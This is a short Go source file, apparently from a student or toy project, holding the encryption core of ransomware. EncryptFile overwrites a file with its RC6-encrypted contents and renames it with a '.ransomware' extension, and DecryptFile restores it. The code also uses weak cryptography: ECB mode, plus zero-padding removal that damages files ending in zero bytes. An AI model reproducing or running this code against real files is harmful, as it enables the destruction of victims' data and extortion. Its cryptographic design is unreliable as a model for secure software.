package utils

import (
	"file_encryption/rc6"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func EncryptFile(key []byte, fileName string) {
	plaintext, err := ioutil.ReadFile(fileName)
	if err != nil {
		panic(err.Error())
	}

	chunk := []byte{}
	buf := make([]byte, rc6.BlockSize)
	ciphertext := []byte{}

	for i := 0; i < len(plaintext); i += rc6.BlockSize {
		if i+rc6.BlockSize >= len(plaintext) {
			left := rc6.BlockSize - len(plaintext[i:])
			padding := []byte{}
			for k := 0; k < left; k++ {
				padding = append(padding, 0x00)
			}
			chunk = append(plaintext[i:], padding...)
		} else {
			chunk = plaintext[i : i+rc6.BlockSize]
		}
		if c, err := rc6.NewCipher(key); err != nil {
			panic(err.Error())
		} else {
			c.Encrypt(buf, chunk)
			ciphertext = append(ciphertext, buf...)
		}
	}

	s := strings.Split(fileName, ".")

	if err := ioutil.WriteFile(fileName, ciphertext, 0644); err != nil {
		fmt.Println("Fail to encrypt the file.")
	}

	if err := os.Rename(fileName, s[0]+".ransomware"); err != nil {
		fmt.Println("Fail to rename file.")
	}
}

func DecryptFile(key []byte, fileName string) []byte {
	ciphertext, err := ioutil.ReadFile(fileName)
	if err != nil {
		panic(err.Error())
	}

	chunk := []byte{}
	buf := make([]byte, rc6.BlockSize)
	decryptedText := []byte{}

	for i := 0; i < len(ciphertext); i += rc6.BlockSize {
		chunk = ciphertext[i : i+rc6.BlockSize]
		if c, err := rc6.NewCipher(key); err != nil {
			panic(err.Error())
		} else {
			c.Decrypt(buf, chunk)
			decryptedText = append(decryptedText, buf...)
		}
	}

	for decryptedText[len(decryptedText)-1] == 0x00 {
		decryptedText = decryptedText[:len(decryptedText)-1]
	}

	s := strings.Split(fileName, ".")

	if err := ioutil.WriteFile(fileName, decryptedText, 0644); err != nil {
		fmt.Println("Fail to decrypt the file.")
	}

	if err := os.Rename(fileName, s[0]+".txt"); err != nil {
		fmt.Println("Fail to rename file.")
	}

	return decryptedText
}
